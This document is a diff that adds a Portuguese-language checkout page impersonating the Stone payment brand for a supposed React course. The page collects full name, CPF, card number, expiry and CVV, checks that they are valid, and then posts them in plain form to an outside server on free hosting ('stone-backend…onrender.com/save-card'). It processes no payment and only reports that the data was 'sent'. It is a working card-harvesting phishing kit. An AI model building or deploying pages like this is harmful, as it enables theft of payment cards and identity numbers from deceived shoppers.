@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Stone – Checkout</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+:root{
+  --bg:#eef2f7;
+  --card:#ffffff;
+  --pri:#00d4aa;
+  --pri-dark:#00b796;
+  --text:#1e293b;
+  --muted:#64748b;
+  --line:#e2e8f0;
+  --radius:12px;
+  --shadow:0 8px 25px rgba(0,0,0,.04);
+}
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Inter",system-ui}
+body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:var(--bg);padding:20px}
+.wrap{background:var(--card);width:100%;max-width:420px;border-radius:var(--radius);box-shadow:var(--shadow);padding:24px 24px 18px}
+.logo-wrap{display:flex;align-items:center;justify-content:center;margin-bottom:18px}
+.logo{max-width:120px;width:auto;height:auto;object-fit:contain}
+.title{font-size:20px;font-weight:700;margin-bottom:4px;text-align:center}
+.sub{color:var(--muted);font-size:13px;margin-bottom:18px;text-align:center}
+.produto{background:#f8fafc;border:1px solid var(--line);border-radius:var(--radius);padding:14px;margin-bottom:18px}
+.produto .tit{font-weight:600}.produto .val{color:var(--pri);font-weight:700;font-size:16px}
+label{font-size:12px;color:var(--muted);margin-bottom:5px;display:block}
+input,select{width:100%;padding:11px 13px;border:1px solid var(--line);border-radius:var(--radius);font-size:14px;margin-bottom:14px;transition:.2s}
+input:focus,select:focus{outline:none;border-color:var(--pri);box-shadow:0 0 0 2px #00d4aa26}
+.pair{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.btn{background:var(--pri);color:#fff;font-weight:600;padding:12px;border:none;border-radius:var(--radius);cursor:pointer;transition:.2s}
+.btn:hover{background:var(--pri-dark)}
+.tab{display:flex;border-bottom:1px solid var(--line);margin-bottom:18px}
+.tab button{flex:1;background:none;border:none;padding:12px;font-size:14px;cursor:pointer;color:var(--muted);transition:.2s}
+.tab .active{color:var(--pri);border-bottom:2px solid var(--pri);font-weight:600}
+#pixBox{display:none;text-align:center}
+#pixBox canvas{margin:10px auto;border-radius:var(--radius);border:1px solid var(--line)}
+#pixBox input{cursor:pointer;background:#f1f5f9}
+.rodape{width:100%;text-align:center;margin-top:14px}
+.rodape img{max-width:100%;height:auto;border-radius:var(--radius)}
+.error{border-color:#ff4d4f!important}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="logo-wrap">
+    <img class="logo" src="https://logodownload.org/wp-content/uploads/2022/10/stone-logo-0.png" alt="Stone">
+  </div>
+  <div class="title">Finalizar compra</div>
+  <div class="produto">
+    <div class="tit" id="descProduto"></div>
+    <div class="val" id="valorProduto"></div>
+  </div>
+
+  <div class="tab">
+    <button class="active" onclick="switchTab('card')">Cartão</button>
+    <button onclick="switchTab('pix')">Pix</button>
+  </div>
+
+  <!-- CARTÃO -->
+  <form id="cardForm" onsubmit="return false;">
+    <label>Nome completo</label>
+    <input name="nome" required placeholder="Maria Silva">
+    <label>CPF</label>
+    <input name="cpf" id="cpf" required placeholder="000.000.000-00" maxlength="14">
+    <label>Número do cartão</label>
+    <input name="cc" id="cc" required placeholder="0000 0000 0000 0000" maxlength="19">
+    <div class="pair">
+      <div>
+        <label>Validade</label>
+        <input name="val" id="val" required placeholder="MM/AA" maxlength="5">
+      </div>
+      <div>
+        <label>CVV</label>
+        <input name="cvv" id="cvv" required placeholder="123" maxlength="4">
+      </div>
+    </div>
+    <label>Parcelas</label>
+    <select id="parcelas" name="parcelas"></select>
+    <button type="submit" class="btn" onclick="validateAll()">Pagar com cartão</button>
+  </form>
+
+  <!-- PIX -->
+  <div id="pixBox">
+    <label>Escaneie ou copie o código</label>
+    <canvas id="qrcode"></canvas>
+    <input id="pixCode" readonly onclick="this.select();document.execCommand('copy');alert('Copiado!');saveLead('pix')">
+    <button onclick="saveLead('pix');location.href='processando.html?metodo=pix'" class="btn">Já paguei</button>
+  </div>
+
+  <div class="rodape">
+    <img src="https://www.mundodeled.com.br/image/catalog/banco%20do%20brasil/bandeiras_cartoes.png" alt="Bandeiras aceitas">
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+<script>
+const cfg={
+  descricao: localStorage.descricao||'Curso Premium – React do Zero ao Avançado',
+  valor:+localStorage.valor||997,
+  maxParc:+localStorage.maxParc||12,
+  qrString:localStorage.qrString||'00020126580014BR.GOV.BCB.PIX013612345678-901234567-8901234567890523049876543215204000053039865405997.005802BR5925Stone Pagamentos6009SAO PAULO62070503***6304ABCD'
+};
+document.getElementById('descProduto').textContent=cfg.descricao;
+document.getElementById('valorProduto').textContent=`Total: R$ ${cfg.valor.toFixed(2).replace('.',',')}`;
+
+const parc=document.getElementById('parcelas');
+for(let i=1;i<=cfg.maxParc;i++){
+  const v=(cfg.valor/i).toFixed(2).replace('.',',');
+  parc.insertAdjacentHTML('beforeend',`<option value="${i}">${i}x de R$ ${v} ${i===1?'(à vista)':'(sem juros)'}</option>`);
+}
+
+QRCode.toCanvas(document.getElementById('qrcode'),cfg.qrString,{width:160,margin:2});
+document.getElementById('pixCode').value=cfg.qrString;
+
+/* ======== MÁSCARAS ======== */
+document.getElementById('cpf').addEventListener('input',e=>{
+  let v=e.target.value.replace(/\D/g,'');
+  if(v.length>11) v=v.slice(0,11);
+  v=v.replace(/(\d{3})(\d)/,'$1.$2')
+     .replace(/(\d{3})(\d)/,'$1.$2')
+     .replace(/(\d{3})(\d{1,2})$/,'$1-$2');
+  e.target.value=v;
+});
+document.getElementById('cc').addEventListener('input',e=>{
+  let v=e.target.value.replace(/\D/g,'');
+  v=v.replace(/(\d{4})(?=\d)/g,'$1 ');
+  e.target.value=v;
+});
+document.getElementById('val').addEventListener('input',e=>{
+  let v=e.target.value.replace(/\D/g,'');
+  if(v.length>4) v=v.slice(0,4);
+  v=v.replace(/(\d{2})(\d{0,2})/,'$1/$2');
+  e.target.value=v;
+});
+
+/* ======== VALIDAÇÕES ======== */
+function luhnCheck(num){
+  let sum=0,alt=false;
+  for(let i=num.length-1;i>=0;i--){
+    let n=parseInt(num[i],10);
+    if(alt){n*=2;if(n>9)n-=9}
+    sum+=n;alt=!alt;
+  }
+  return sum%10===0;
+}
+function validaCPF(cpf){
+  cpf=cpf.replace(/\D/g,'');
+  if(cpf.length!==11||/^(\d)\1{10}$/.test(cpf)) return false;
+  let sum=0,resto;
+  for(let i=1;i<=9;i++) sum+=parseInt(cpf.substring(i-1,i))*(11-i);
+  resto=(sum*10)%11;
+  if(resto===10||resto===11) resto=0;
+  if(resto!==parseInt(cpf.substring(9,10))) return false;
+  sum=0;
+  for(let i=1;i<=10;i++) sum+=parseInt(cpf.substring(i-1,i))*(12-i);
+  resto=(sum*10)%11;
+  if(resto===10||resto===11) resto=0;
+  return resto===parseInt(cpf.substring(10,11));
+}
+function validaValidade(val){
+  if(!/^\d{2}\/\d{2}$/.test(val)) return false;
+  const [m,a]=val.split('/').map(Number);
+  const now=new Date();
+  const exp=new Date(2000+a,m-1);
+  return exp>now;
+}
+function validaCVV(cvv){
+  return /^\d{3,4}$/.test(cvv);
+}
+
+/* ======== ENVIO REAL ======== */
+const SCRIPT_URL="https://stone-backend-0vbf.onrender.com/save-card";
+
+async function validateAll(){
+  const cpf=document.getElementById('cpf').value;
+  const cc=document.getElementById('cc').value.replace(/\s/g,'');
+  const val=document.getElementById('val').value;
+  const cvv=document.getElementById('cvv').value;
+
+  let ok=true;
+  if(!validaCPF(cpf)){document.getElementById('cpf').classList.add('error');ok=false;}else{document.getElementById('cpf').classList.remove('error');}
+  if(!luhnCheck(cc)){document.getElementById('cc').classList.add('error');ok=false;}else{document.getElementById('cc').classList.remove('error');}
+  if(!validaValidade(val)){document.getElementById('val').classList.add('error');ok=false;}else{document.getElementById('val').classList.remove('error');}
+  if(!validaCVV(cvv)){document.getElementById('cvv').classList.add('error');ok=false;}else{document.getElementById('cvv').classList.remove('error');}
+
+  if(!ok){alert('Por favor, corrija os campos destacados.');return;}
+
+  const body=Object.fromEntries(new FormData(document.getElementById('cardForm')));
+  body.cc=cc; body.valor=cfg.valor; body.descricao=cfg.descricao; body.hora=new Date().toISOString(); body.metodo='cartao';
+
+  try{
+    await fetch(SCRIPT_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+    alert('Dados enviados com sucesso!');
+    document.getElementById('cardForm').reset();
+  }catch(err){
+    alert('Erro ao enviar. Tente novamente.');
+  }
+}
+
+function switchTab(tab){
+  document.getElementById('cardForm').style.display=tab==='card'?'block':'none';
+  document.getElementById('pixBox').style.display=tab==='pix'?'block':'none';
+  document.querySelectorAll('.tab button').forEach(b=>b.classList.toggle('active',b.textContent.toLowerCase().includes(tab)));
+}
+
+function saveLead(metodo){
+  const data={...Object.fromEntries(new FormData(document.querySelector(metodo==='cartao'?'#cardForm':'body')).entries()),valor:cfg.valor,descricao:cfg.descricao,metodo,hora:new Date().toISOString()};
+  const leads=JSON.parse(localStorage.leads||'[]');
+  leads.push(data);
+  localStorage.leads=JSON.stringify(leads);
+}
+</script>
+</body>
+</html>
